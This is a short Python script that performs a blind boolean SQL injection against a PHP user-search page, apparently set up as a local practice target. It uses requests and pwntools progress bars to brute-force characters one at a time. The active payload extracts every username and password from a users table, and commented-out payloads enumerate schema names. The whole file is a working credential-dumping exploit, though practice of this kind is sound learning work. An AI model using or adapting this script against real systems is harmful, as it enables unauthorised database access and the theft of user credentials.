#!/usr/bin/python3
import requests
from pwn import *
import signal
import sys
import time

# manage force stop
def def_handler(sig, frame):
    print('\n[!] Exiting...\n')
    sys.exit(1)

def makeSQLI():
    # show progess
    progress_bar_1 = log.progress('BRUTE FORCE')
    progress_bar_1.status('Starting brute force')
    time.sleep(2)
    progress_bar_2 = log.progress('Extracted data')

    # extracted data
    matchedString = ''
    for word_position in range(1, 100):
        for character in range(33, 127):
            # construct url injection
            #sqli_url = main_url + '?' + 'id=9 or (select(select ascii(substring(username,%d,1)) from users where id=1)=%d)' % (word_position, character)
            # retrieve usernames by using nested queries
            #sqli_url = main_url + '?' + 'id=9 or (select(select ascii(substring((select group_concat(username) from users),%d,1)) from users where id=1)=%d)' % (word_position, character)
            # retrieve schema names by using nested queries
            #sqli_url = main_url + '?' + 'id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id=1)=%d)' % (word_position, character)
            # retrieve usernames and password separated by ':' by using nested queries
            sqli_url = main_url + '?' + 'id=9 or (select(select ascii(substring((select group_concat(username, 0x3a, password) from users),%d,1)) from users where id=1)=%d)' % (word_position, character)

            progress_bar_1.status(sqli_url)

            # verify status code
            r = requests.get(sqli_url)
            if r.status_code == 200:
                matchedString += chr(character)
                progress_bar_2.status(matchedString)
                break

# ctrl+c
signal.signal(signal.SIGINT, def_handler)

# global variables
main_url = "http://localhost/searchUsers2.php"
characters = string.printable

if __name__ == '__main__':
    makeSQLI()

